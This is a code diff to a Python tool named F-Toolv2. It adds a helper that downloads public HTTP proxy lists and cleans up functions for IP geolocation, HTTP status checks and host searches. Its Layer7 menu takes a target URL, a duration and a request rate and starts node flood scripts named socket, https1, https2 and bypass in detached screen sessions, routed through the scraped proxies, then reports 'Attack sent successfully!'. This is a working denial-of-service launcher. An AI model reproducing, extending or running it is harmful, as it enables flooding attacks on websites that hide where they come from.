@@ -36,6 +36,18 @@ class Home:
 		self.help = help
 		self.dev = dev
 
+	def getproxies(self):
+		self.styleText("\n [*] Downloading Proxy...\n")
+		file_name = "utils/http.txt"
+		http_proxies = [
+			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
+			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"]
+		with open(file_name, 'w'):
+			for proxies in http_proxies:
+				if httpx.get(proxies).status_code == 200:
+					with open(file_name, 'a') as p:
+						p.write(httpx.get(proxies).text)
 	def styleText(self, text):
 		for animation in text:
 			sys.stdout.write(animation)
@@ -109,10 +121,9 @@ class response_url:
 			if url == '':
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
-			info = Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']
-
 			if resp['status'] == 'success':
-				return info
+				return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']
+
 			else:
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 		except requests.exceptions.ConnectionError:
@@ -123,12 +134,10 @@ class response_url:
 			if ip == '':
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
 			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()
-
-			info = Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
-
 			if resp['status'] == 'success':
-				return info
-
+				return Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
+			else:
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
 		except KeyError:
 			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
 		except requests.exceptions.ConnectionError:
@@ -136,45 +145,43 @@ class response_url:
 
 	def http_status(self, url):
 		try:
-			parser = parse.urlparse(url)
-			if parser.scheme == "":
+			if parse.urlparse(url).scheme == "":
 				url = "http://"+url
 			resp = httpx.get(url, headers=self.headers)
-			status = resp.status_code
-			if status == 200:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (OK)"
-			elif status == 301:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Moved Permanently)"
-			elif status == 302:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Found)"
-			elif status == 303:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (See Other)"
-			elif status == 307:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Temporary Redirect)"
-			elif status == 400:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Unauthorized)"
-			elif status == 410:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Gone)"
-			elif status == 401:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Bad Requests)"
-			elif status == 403:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Forbidden)"
-			elif status == 404:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Not Found)"
-			elif status == 429:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (To Many Requests)"
-			elif status == 500:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Internal Server Error)"
-			elif status == 502:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Bad Gateway)"
-			elif status == 503:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Service Unavailable)"
-			elif status == 504:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Gateway Timeout)"
-			elif status == 507:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Insufficient Storage)"
-			elif status == 508:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Loop Detected)"
+			if resp.status_code == 200:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (OK)"
+			elif resp.status_code == 301:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Moved Permanently)"
+			elif resp.status_code == 302:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Found)"
+			elif resp.status_code == 303:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (See Other)"
+			elif resp.status_code == 307:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Temporary Redirect)"
+			elif resp.status_code == 400:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Unauthorized)"
+			elif resp.status_code == 410:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gone)"
+			elif resp.status_code == 401:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Requests)"
+			elif resp.status_code == 403:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Forbidden)"
+			elif resp.status_code == 404:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Not Found)"
+			elif resp.status_code == 429:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (To Many Requests)"
+			elif resp.status_code == 500:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Internal Server Error)"
+			elif resp.status_code == 502:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Gateway)"
+			elif resp.status_code == 503:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Service Unavailable)"
+			elif resp.status_code == 504:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gateway Timeout)"
+			elif resp.status_code == 507:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Insufficient Storage)"
+			elif resp.status_code == 508:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
 			else:
 				return Color.LR+f"    [+] Result: (Connection timeout)"
 
@@ -189,11 +196,10 @@ class response_url:
 		try:
 			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)
 
-			info = resp.text
-			if info == 'error invalid host':
+			if resp.text == 'error invalid host':
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 			else:
-				return Color.LG+info
+				return Color.LG+resp.text
 		except requests.exceptions.ConnectionError:
 			return Color.LR+"Error: Check your Internet Connection."
 
@@ -201,13 +207,12 @@ class response_url:
 		try:
 			resp = requests.get(f"https://api.hackertarget.com/pagelinks/?q={url}", headers=self.headers)
 
-			info = resp.text
-			if info == "input url is invalid":
+			if resp.text == "input url is invalid":
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
-			elif info == "error getting links":
+			elif resp.text == "error getting links":
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" No Links Found!"
 			else:
-				return Color.LG+info
+				return Color.LG+resp.text
 		except requests.exceptions.ConnectionError:
 			return Color.LR+"Error: Check your Internet Connection."
 
@@ -224,8 +229,7 @@ class Tool:
 	def proxy(self, new):
 		try:
 			with open("utils/url.json", 'r') as p:
-				read_url = p.read()
-				readjson = json.loads(read_url)
+				readjson = json.loads(p.read())
 		except FileNotFoundError:
 			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
 		if new == 'ref' or new == 'REF' or new == 'clear' or new == 'CLEAR':
@@ -234,22 +238,19 @@ class Tool:
 		else:
 			F_Tool.styleText("[*] Downloading All Proxy...")
 		try:
-			http  = requests.get(readjson['Proxies'][0]['url'], headers=self.headers).text
-			http += requests.get(readjson['Proxies'][1]['url'], headers=self.headers).text
-			http += requests.get(readjson['Proxies'][2]['url'], headers=self.headers).text
-			http += requests.get(readjson['Proxies'][3]['url'], headers=self.headers).text
-			https = requests.get(readjson['Proxies'][4]['url'], headers=self.headers).text
-			https += requests.get(readjson['Proxies'][5]['url'], headers=self.headers).text
-			https += requests.get(readjson['Proxies'][6]['url'], headers=self.headers).text
-			https +=  requests.get(readjson['Proxies'][7]['url'], headers=self.headers).text
-			socks4  = requests.get(readjson['Proxies'][8]['url'], headers=self.headers).text
-			socks4 += requests.get(readjson['Proxies'][9]['url'], headers=self.headers).text
-			socks4 += requests.get(readjson['Proxies'][10]['url'], headers=self.headers).text
-			socks4 += requests.get(readjson['Proxies'][11]['url'], headers=self.headers).text
-			socks5 = requests.get(readjson['Proxies'][12]['url'], headers=self.headers).text
-			socks5 += requests.get(readjson['Proxies'][13]['url'], headers=self.headers).text
-			socks5 += requests.get(readjson['Proxies'][14]['url'], headers=self.headers).text
-			socks5 += requests.get(readjson['Proxies'][15]['url'], headers=self.headers).text
+			for proxy in readjson['Proxies']:
+				if proxy['type'] == 1:
+					if requests.get(proxy["url"]).status_code == 200:
+						http = requests.get(proxy["url"], headers=self.headers).text
+				if proxy['type'] == 2:
+					if requests.get(proxy["url"]).status_code == 200:
+						https = requests.get(proxy["url"], headers=self.headers).text
+				if proxy['type'] == 3:
+					if requests.get(proxy["url"]).status_code == 200:
+						socks4 = requests.get(proxy["url"], headers=self.headers).text
+				if proxy['type'] == 4:
+					if requests.get(proxy["url"]).status_code == 200:
+						socks5 = requests.get(proxy["url"], headers=self.headers).text
 			os.system('clear')
 		except requests.exceptions.ConnectionError:
 			sys.exit(Color.LR+"Error: Check your Internet Connection.")
@@ -580,7 +581,9 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
-		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
+		http_proxies = [
+			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
+		]
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
@@ -589,10 +592,7 @@ class Tool:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/http.txt", 'w') as p:
-						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -600,10 +600,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/http.txt", 'w') as p:
-						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -611,10 +608,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/http.txt", 'w') as p:
-						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -622,10 +616,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.styleText("\n [*] Downloading Proxy...\n")
-					with open("utils/http.txt", 'w') as p:
-						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
+					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
